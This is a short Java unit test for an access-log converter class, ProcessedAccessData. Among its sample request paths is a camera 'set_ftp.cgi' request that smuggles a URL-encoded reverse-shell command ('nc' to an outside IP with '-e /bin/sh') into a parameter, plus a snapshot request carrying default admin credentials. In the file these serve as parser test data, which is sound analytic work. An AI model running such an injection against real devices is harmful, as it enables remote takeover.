package com.shion1305.route.object;

import org.junit.Test;

class ProcessedAccessDataTest {
    public static void main(String[] args) {
        new ProcessedAccessDataTest().testConverter();
    }

    @Test
    public void testConverter() {
        System.out.println(ProcessedAccessData.convertToTextGroup("/Public/Mobile/ecshe_css/wapmain.css?v=1545408652"));
        System.out.println(ProcessedAccessData.convertToTextGroup("/snapshot.cgi?user=admin&pwd=12345"));
        System.out.println(ProcessedAccessData.convertToTextGroup("/set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_\n" +
                "interval=0&svr=%24%28nc+104.244.75.62+1245+-e+%2Fbin%2Fsh%29"));
        System.out.println(ProcessedAccessData.convertToTextGroup("/Public/Mobile/ecshe_css/wapmain.css?v=1545408652"));
    }
}